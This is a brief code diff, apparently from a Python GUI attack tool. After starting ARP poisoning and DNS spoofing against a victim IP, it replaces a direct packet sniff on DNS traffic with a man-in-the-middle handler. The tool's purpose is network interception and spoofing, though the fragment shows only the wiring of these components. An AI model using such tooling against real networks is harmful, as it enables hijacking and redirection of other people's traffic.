@@ -263,13 +263,9 @@ class AttackGUI:
                 arp_poisoner.start()
 
                 dns_spoofer = Dns_spoofing.DNSSpoofer(sc.conf.iface, victim_ip, domain, self.attacker_ipv4, self.attacker_ipv6, self.log)
-
-                sc.sniff(
-                    iface=sc.conf.iface,
-                    filter="udp port 53",
-                    prn=dns_spoofer.dns_spoofer,
-                    store=0
-                )
+                mitm_handler = MitmHandler(sc.conf.iface, server_ip, victim_ip, spoof_mac, self.attacker_ipv4, self.attacker_ipv6, self.log)
+                mitm_handler.add_filter(dns_spoofer.dns_spoofer)
+                mitm_handler.start()
 
             # MITM
             else:
